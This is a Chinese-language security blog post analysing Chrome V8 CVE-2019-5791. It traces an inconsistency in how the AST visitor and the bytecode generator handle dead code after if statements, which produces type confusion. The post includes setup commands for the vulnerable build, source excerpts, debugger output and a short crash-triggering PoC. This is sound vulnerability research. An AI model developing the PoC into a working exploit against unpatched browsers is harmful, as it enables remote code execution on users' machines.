**作者：天融信阿尔法实验室**  
**原文链接：**
近日，作者研究了chrome
v8的一个漏洞cve-2019-5791，cve的漏洞描述是由于不合适的优化可以导致越界读，但实际上该漏洞是由于在语法树遍历阶段和实际生成字节码阶段对死结点的判定不一致导致的类型混淆，成功利用该漏洞可以导致rce。
### 漏洞环境
漏洞的修复网址是，这里使用的commit是`2cf6232948c76f888ff638aabb381112582e88ad`。使用如下命令搭建漏洞环境
    git reset --hard 2cf6232948c76f888ff638aabb381112582e88ad
    gclient sync -f
    tools/dev/v8gen.py x64.debug 
    ninja -C out.gn/x64.debug d8
    tools/dev/v8gen.py x64.release
    ninja -C out.gn/x64.release d8
### 漏洞分析
#### ast visitor
首先看一下漏洞修复的描述:
    [ast] Always visit all AST nodes, even dead nodes
    We'll let the bytecode compiler and optimizing compilers deal with dead code,
    rather than the ast visitors. The problem is that the visitors previously
    disagreed upon what was dead. That's bad if necessary visitors omit parts of
    the code that the bytecode generator will actually visit.
    I did consider removing the AST nodes immediately in the parser, but that
    adds overhead and actually broke code coverage. Since dead code shouldn't be
    shipped to the browser anyway (and we can still omit it later in the bytecode
    generator), I opted for keeping the nodes instead.
    Change-Id: Ib02fa9031b17556d2e1d46af6648356486f8433d
    Reviewed-on: https://chromium-review.googlesource.com/c/1470108
    Commit-Queue: Toon Verwaest 
    Reviewed-by: Leszek Swirski 
    Cr-Commit-Position: refs/heads/master@{#59569}
通过漏洞描述我们大致知道问题出在语法树的遍历阶段，具体点来说就是语法树遍历阶段和字节码生成阶段对死结点的判定不一致。那么现在的问题就是这两个阶段对死结点的判定具体有什么不同，对死结点判定的不一致又会导致什么问题。
在漏洞修复页面查看一下diff的内容看一下修复漏洞改了哪些东西，通过被修改代码的文件名发现只是去掉了语法树遍历阶段的一些代码，加了几行对漏洞分析帮助不大的输出和一个漏洞poc。从这些信息我们可以得到ast
visitor处理语法树死结点跳转位置的代码如下，
    template 
    void AstTraversalVisitor::VisitStatements(
        const ZonePtrList* stmts) {
      for (int i = 0; i length(); ++i) {
        Statement* stmt = stmts->at(i);
        RECURSE(Visit(stmt));
        if (stmt->IsJump()) break;
      }
    }
    bool Statement::IsJump() const {
      switch (node_type()) {
    #define JUMP_NODE_LIST(V) \
      V(Block)                \
      V(ExpressionStatement)  \
      V(ContinueStatement)    \
      V(BreakStatement)       \
      V(ReturnStatement)      \
      V(IfStatement)
    #define GENERATE_CASE(Node) \
      case k##Node:             \
        return static_cast(this)->IsJump();
        JUMP_NODE_LIST(GENERATE_CASE)
    #undef GENERATE_CASE
    #undef JUMP_NODE_LIST
        default:
          return false;
      }
    }
从上边`ast
visitor`中处理语法树statements的代码我们可以得到`stmt->IsJump()`为真时会跳出循环不去处理(使用自定义的RECURSE方法)之后的代码。注意这里`stmt->IsJump()`为真的条件中有一个是`IfStatement`。
我们跟进`ast-traversal-visitor.h`，发现这个文件定义了一个继承自AstVisitor的类`AstTraversalVisitor`，定义了一些处理不同类型语法树结点的操作，而在处理不同类型语法树结点时又使用了RECURSE宏调用相应语法树结点类型的visit方法继续遍历语法树，在遍历节点过程中主要记录语法树深度、检查语法树结点递归时是否栈溢出。
以上是我们可以从漏洞修复得到的信息，但是仅凭这些信息显然没办法了解漏洞的本质。此时我们还需要解决的一个问题是找到v8中真正生成字节码`bytecode-generator`时对死结点处理的代码。
#### bytecode-generator
我对v8的源代码不是很熟悉，找`bytecode-generator`处理语法树死结点的代码我这里用的方法是在patch中`ast-traversal-visitor.h`代码修改的地方（即`bast-traversal-visitor.h:113`）下断点，然后不断栈回溯找到的。最终得到v8生成语法树解析生成字节码的大致过程如下（这里有一个点是v8会把js代码分成`top-level`和`non top-level`部分，普通语句和函数声明是`top-level`，函数定义部分是`non top-level`。）
    1.解析top level部分的代码，生成语法树并生成这部分代码的未优化字节码
    2.解析non top-level运行到的函数的代码，生成语法树，调用ast visitor和bytecode-generator的代码生成字节码。这里最终生成字节码调用的函数是bytecode-generator.cc BytecodeGenerator::GenerateBytecode
我们跟进最终生成字节码的函数`BytecodeGenerator::GenerateBytecode`，
    void BytecodeGenerator::GenerateBytecode(uintptr_t stack_limit) {
    ......
      if (closure_scope()->NeedsContext()) {
        // Push a new inner context scope for the function.
        BuildNewLocalActivationContext();
        ContextScope local_function_context(this, closure_scope());
        BuildLocalActivationContextInitialization();
        GenerateBytecodeBody();
      } else {
        GenerateBytecodeBody();
      }
      // Check that we are not falling off the end.
      DCHECK(!builder()->RequiresImplicitReturn());
    }
主要是进行了栈溢出检查、范围检查、分配寄存器，然后调用`GenerateBytecodeBody()`真正生成字节码。
    void BytecodeGenerator::GenerateBytecodeBody() {
    ......
      // Visit statements in the function body.
      VisitStatements(info()->literal()->body());
      // Emit an implicit return instruction in case control flow can fall off the
      // end of the function without an explicit return being present on all paths.
      if (builder()->RequiresImplicitReturn()) {
        builder()->LoadUndefined();
        BuildReturn();
      }
    }
在`GenerateBytecodeBody()`中主要是根据语法树结点类型调用相应visit函数处理相应结点，注意这里`VisitStatements(info()->literal()->body())`;调用的是如下代码
    void BytecodeGenerator::VisitStatements(
        const ZonePtrList* statements) {
      for (int i = 0; i length(); i++) {
        // Allocate an outer register allocations scope for the statement.
        RegisterAllocationScope allocation_scope(this);
        Statement* stmt = statements->at(i);
        Visit(stmt);
        if (builder()->RemainderOfBlockIsDead()) break;
      }
    }
`BytecodeGenerator::VisitStatements`即实际生成字节码时处理语法树声明类型结点的代码，这里我们发现在实际生成字节码时`builder()->RemainderOfBlockIsDead()`条件为真时会跳出循环不去处理之后的代码。这样我们最开始的问题`ast
visitor`和`bytecode-generator`处理语法树死结点的不同就转化为`builder()->RemainderOfBlockIsDead()`条件为真和`stmt->IsJump()`条件为真时的不同。
我们找到`builder()->RemainderOfBlockIsDead()`的定义,
    void BytecodeArrayWriter::UpdateExitSeenInBlock(Bytecode bytecode) {
      switch (bytecode) {
        case Bytecode::kReturn:
        case Bytecode::kThrow:
        case Bytecode::kReThrow:
        case Bytecode::kAbort:
        case Bytecode::kJump:
        case Bytecode::kJumpConstant:
        case Bytecode::kSuspendGenerator:
          exit_seen_in_block_ = true;
          break;
        default:
          break;
      }
    }
对比`stmt->IsJump()`的定义
    bool Statement::IsJump() const {
      switch (node_type()) {
    #define JUMP_NODE_LIST(V) \
      V(Block)                \
      V(ExpressionStatement)  \
      V(ContinueStatement)    \
      V(BreakStatement)       \
      V(ReturnStatement)      \
      V(IfStatement)
    #define GENERATE_CASE(Node) \
      case k##Node:             \
        return static_cast(this)->IsJump();
        JUMP_NODE_LIST(GENERATE_CASE)
    #undef GENERATE_CASE
    #undef JUMP_NODE_LIST
        default:
          return false;
      }
    }
对比可以发现`stmt->IsJump()`为真的条件多了`IfStatement`，也就是说ast
visitor不会处理if死结点之后的代码，而实际生成字节码时会处理到这部分ast
visitor没有检查过的代码。那接下来的问题就是，这么做会导致什么后果呢？
#### 类型混淆的原因
经过调试发现漏洞版本的v8在处理到形如poc中代码的箭头函数时，
    // Copyright 2019 the V8 project authors. All rights reserved.
    // Use of this source code is governed by a BSD-style license that can be
    // found in the LICENSE file.
    var asdf = false;
    const f =
      (v1 = (function g() {
        if (asdf) { return; } else { return; }
        (function h() {});
      })()) => 1;
    f();
会调用`bytecode-generator.cc
BytecodeGenerator::AllocateDeferredConstants`，此时栈回溯如下
    #0  v8::internal::interpreter::BytecodeGenerator::AllocateDeferredConstants (this=0x564b468658c0, isolate=0x564b467d7e00, script=...) at ../../src/interpreter/bytecode-generator.cc:988
    #1  0x00007f0b368acd87 in v8::internal::interpreter::BytecodeGenerator::FinalizeBytecode (this=0x564b468658c0, isolate=0x564b467d7e00, script=...) at ../../src/interpreter/bytecode-generator.cc:964
    #2  0x00007f0b368d8177 in v8::internal::interpreter::InterpreterCompilationJob::FinalizeJobImpl (this=0x564b468657f0, shared_info=..., isolate=0x564b467d7e00) at ../../src/interpreter/interpreter.cc:214
    #3  0x00007f0b362b3a3f in v8::internal::UnoptimizedCompilationJob::FinalizeJob (this=0x564b468657f0, shared_info=..., isolate=0x564b467d7e00) at ../../src/compiler.cc:158
    #4  0x00007f0b362bcdb4 in v8::internal::(anonymous namespace)::FinalizeUnoptimizedCompilationJob (job=0x564b468657f0, shared_info=..., isolate=0x564b467d7e00) at ../../src/compiler.cc:425
    #5  0x00007f0b362b65bf in v8::internal::(anonymous namespace)::FinalizeUnoptimizedCode (parse_info=0x7fffd1cf1730, isolate=0x564b467d7e00, shared_info=..., outer_function_job=0x564b46865390, inner_function_jobs=0x7fffd1cf16c0) at ../../src/compiler.cc:594
    #6  0x00007f0b362b60c5 in v8::internal::Compiler::Compile (shared_info=..., flag=v8::internal::Compiler::KEEP_EXCEPTION, is_compiled_scope=0x7fffd1cf1b58) at ../../src/compiler.cc:1182
    #7  0x00007f0b362b68b6 in v8::internal::Compiler::Compile (function=..., flag=v8::internal::Compiler::KEEP_EXCEPTION, is_compiled_scope=0x7fffd1cf1b58) at ../../src/compiler.cc:1212
    #8  0x00007f0b36b905c4 in v8::internal::__RT_impl_Runtime_CompileLazy (args=..., isolate=0x564b467d7e00) at ../../src/runtime/runtime-compiler.cc:40
    #9  0x00007f0b36b901e2 in v8::internal::Runtime_CompileLazy (args_length=1, args_object=0x7fffd1cf1c28, isolate=0x564b467d7e00) at ../../src/runtime/runtime-compiler.cc:22
    #10 0x00007f0b372e3132 in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit () from /home/r00t/v8/out.gn/x64.debug/./libv8.so
    #11 0x00007f0b36f64761 in Builtins_CompileLazy () from /home/r00t/v8/out.gn/x64.debug/./libv8.so
    #12 0x00007f0b36f486c0 in Builtins_ArgumentsAdaptorTrampoline () from /home/r00t/v8/out.gn/x64.debug/./libv8.so
    #13 0x00003d48921004d1 in ?? ()
    #14 0x00003ea80bf81521 in ?? ()
    #15 0x0000000000000000 in ?? ()
跟进`BytecodeGenerator::AllocateDeferredConstants`，
    void BytecodeGenerator::AllocateDeferredConstants(Isolate* isolate,
                                                      Handle script) {
    ......
      // Build array literal constant elements
      for (std::pair literal : array_literals_) {
        ArrayLiteral* array_literal = literal.first;
        Handle constant_elements =
            array_literal->GetOrBuildBoilerplateDescription(isolate);
        builder()->SetDeferredConstantPoolEntry(literal.second, constant_elements);
      }
    ......
    }
`BytecodeGenerator::AllocateDeferredConstants`主要调用对应的方法处理语法树不同类型节点并将当前语法树结点偏移`literal.second`的元素视为下一个要处理的当前结点类型入口即视为与当前结点类型一致，例如在构造array对象常量时，会调用`SetDeferredConstantPoolEntry`设置`literal.second为`当前数组的下一个入口点，即偏移`literal.second`的位置视为数组类型，这里`literal.second`为一个索引值。
    pwndbg> p literal
    $4 = {
      first = 0x55f4e2734868, 
      second = 2
    }
由于ast visitor没有检查if死结点之后代码的数据类型，而`bytecode-generator`在实际生成字节码时会把语法树当前结点偏移literal.second的位置视为当前节点类型从而最终导致类型混淆。
如poc中的代码在执行到`compiler.cc :961 maybe_existing =
script->FindSharedFunctionInfo(isolate,
literal)`时，此时literal的内容已经是非法的object对象，debug编译的v8类型检查错误导致崩溃。
    pwndbg> p literal
    $2 = (v8::internal::FunctionLiteral *) 0x55f5e5bbad88
    pwndbg> x/10xg 0x55f5e5bbad88
    0x55f5e5bbad88: 0x002000e60000010b  0x0000000000000000
    0x55f5e5bbad98: 0x0000010b00000000  0x0000000400000000
    0x55f5e5bbada8: 0x000055f5e5bbade0  0x000055f5e5bbab00
    0x55f5e5bbadb8: 0x0000000000000000  0x0000000000000000
    0x55f5e5bbadc8: 0x000055f5e5bba048  0x0000000000000000